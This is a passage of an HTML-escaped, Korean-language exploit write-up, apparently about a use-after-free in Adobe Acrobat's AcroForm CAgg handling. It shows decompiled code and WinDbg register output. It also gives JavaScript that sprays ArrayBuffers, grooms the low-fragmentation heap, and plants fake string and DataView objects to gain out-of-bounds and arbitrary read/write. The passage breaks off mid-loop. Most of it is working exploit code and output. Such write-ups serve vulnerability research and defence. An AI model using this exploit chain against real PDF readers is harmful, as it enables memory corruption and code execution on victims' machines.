        Myhead[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a4;
    }
    ...
  }
  ...
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;a2&lt;/code&gt;)&amp;#xB294; &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;v8[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC4F0;&amp;#xC778; &lt;code&gt;Parent&lt;/code&gt;(0x20000044)&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&amp;#xC138; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;a3&lt;/code&gt;)&amp;#xC740;  &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC4F0;&amp;#xC778; 0&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &lt;code&gt;a2[2] = (int)a4;&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;Parent + 8&lt;/code&gt;(0x2000004c)&amp;#xC5D0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC4F0;&amp;#xC774;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000044 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=20000060 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=20000058 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=291a1bf8 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=291a1bf8 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=20000058
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6385bccf &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457ab88 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457ab94 &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200246
AcroForm!hb_set_invert+0x3d1f:
6385bccf 897008          mov     dword ptr [eax+8],esi ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;2000004c&lt;/span&gt;=0000ffe8&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Parent + 8&lt;/code&gt;&amp;#xC740; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; length&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xACE0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB294; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC6D0;&amp;#xB798;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; 0xffe8&amp;#xBCF4;&amp;#xB2E4; &amp;#xD6E8;&amp;#xC52C; &amp;#xD07D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; OOB Read/Write&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Javascript-code&#34;&gt;&lt;a href=&#34;#Javascript-code&#34; class=&#34;headerlink&#34; title=&#34;Javascript code&#34;&gt;&lt;/a&gt;Javascript code&lt;/h3&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &amp;#xC704; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; OOB Read/Write&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB294; Javascript &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/*&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;....&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;*/&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ALLOC_SIZE = &lt;span class=&#34;hljs-number&#34;&gt;0x10000&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ARR_BUF_BASE = &lt;span class=&#34;hljs-number&#34;&gt;0x20000048&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; ARR_BUF_MALLOC_BASE = &lt;span class=&#34;hljs-number&#34;&gt;0x20000040&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; arrBufPtr = ARR_BUF_BASE + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_STR_START = &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_STR = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_DV_START = &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_DV = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x180&lt;/span&gt;;
&lt;span class=&#34;hljs-comment&#34;&gt;/*&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;....&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;*/&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;groomLFH&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;size, count&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; code =
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u0058%u2000%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484&amp;quot;&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; string = &lt;span class=&#34;hljs-built_in&#34;&gt;unescape&lt;/span&gt;(code);

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; count; i++) {
        chunks.push(string.substr(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, (size - &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) / &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;).toUpperCase());
    }

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; chunks.length; i += &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) {
        chunks[i] = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;delete&lt;/span&gt; chunks[i];
    }
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;sprayArrBuffers&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x1500&lt;/span&gt;; i++) {
        bufs[i] = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(ALLOC_SIZE);
        &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; uintArr = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint32Array&lt;/span&gt;(bufs[i]);
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; k = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; k &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;; k++) {
            uintArr[k] = &lt;span class=&#34;hljs-number&#34;&gt;0x33333333&lt;/span&gt;;
        }
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;//first deref a = *ecx&lt;/span&gt;
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x41424344&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;//map size&lt;/span&gt;
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x41424344&lt;/span&gt;;
        uintArr[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = ARR_BUF_BASE - &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;

        &lt;span class=&#34;hljs-comment&#34;&gt;// fake string for arbitrary read&lt;/span&gt;
        uintArr[FAKE_STR_START] = &lt;span class=&#34;hljs-number&#34;&gt;0x102&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;//type&lt;/span&gt;
        uintArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// buffer&lt;/span&gt;
        uintArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;;
        uintArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;;

        &lt;span class=&#34;hljs-comment&#34;&gt;// fake dataview for arbitrary write&lt;/span&gt;
        uintArr[FAKE_DV_START] = &lt;span class=&#34;hljs-number&#34;&gt;0x77777777&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;delete&lt;/span&gt; uintArr;
        uintArr = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;
    }

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;; i++) {
        arrs[i] = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;);
        arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x47484950&lt;/span&gt;;
        arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = targetStr;
        arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = targetDV;
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; k = &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;; k &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;5000&lt;/span&gt;; k++) {
            arrs[i][k] = &lt;span class=&#34;hljs-number&#34;&gt;0x50515051&lt;/span&gt;;
        }
    }
}

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] spraying array buffer...&amp;quot;&lt;/span&gt;);

sprayArrBuffers();

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] pre-populating LFH...&amp;quot;&lt;/span&gt;);

groomLFH(&lt;span class=&#34;hljs-number&#34;&gt;68&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5000&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;/*&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;Trigger the Bug&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;*/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;sprayArrBuffers&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; 0xffe8 &amp;#xD06C;&amp;#xAE30;&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; 0x20000048&amp;#xC5D0; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; OOB Read/Write&amp;#xB85C; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &lt;code&gt;Array&lt;/code&gt;&amp;#xB97C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xD558;&amp;#xC5EC; &amp;#xC778;&amp;#xC811;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB294; &amp;#xCD94;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC784;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C; &amp;#xC77D;&amp;#xAE30;/&amp;#xC4F0;&amp;#xAE30;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB418;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::lower_bound&lt;/code&gt;&amp;#xC640;  &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::insert&lt;/code&gt;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; length&amp;#xAC00; &amp;#xB36E;&amp;#xC5B4; &amp;#xC4F0;&amp;#xC774;&amp;#xB3C4;&amp;#xB85D; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;groomLFH&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;String&lt;/code&gt; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xD560;&amp;#xB2F9;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;%u0058%u2000&lt;/code&gt;&amp;#xC774; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xACE0; &lt;code&gt;unescape&lt;/code&gt;&amp;#xB85C; &amp;#xC778;&amp;#xD574; fake &lt;code&gt;map&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC778; 0x20000058&amp;#xB85C; &amp;#xBCC0;&amp;#xACBD;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB41C; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;groomLFH&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC774; &amp;#xBCC0;&amp;#xD658;&amp;#xB41C; &lt;code&gt;CAgg&lt;/code&gt;&amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC740; &amp;#xB2E4;&amp;#xC2DC; &amp;#xBCC0;&amp;#xD658;&amp;#xC744; &amp;#xAC70;&amp;#xCE58;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xB370; &amp;#xC774;&amp;#xB54C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC62E;&amp;#xAE38; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. brute-force&amp;#xB85C; &amp;#xC54C;&amp;#xC544;&amp;#xB0B8; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; 68&amp;#xB85C; &amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC7AC;&amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xC5EC; fake &lt;code&gt;map&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC704;&amp;#xCE58;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer&#34;&gt;&lt;a href=&#34;#2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer&#34; class=&#34;headerlink&#34; title=&#34;2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer&#34;&gt;&lt;/a&gt;2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer&lt;/h2&gt;&lt;p&gt;length&amp;#xAC00; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; OOB Read/Write&amp;#xB85C; &amp;#xB2E4;&amp;#xB978; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xC5EC; &amp;#xCD94;&amp;#xD6C4;&amp;#xC5D0; Arbitrary Address Read/Write&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &amp;#xAE38;&amp;#xC774;&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; arrStart = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; corruptedTypedArr = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; originalTargetStrAddr = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,
    originalTargetDVAddr = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; bufs.length; i++) {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (bufs[i].byteLength != ALLOC_SIZE) {
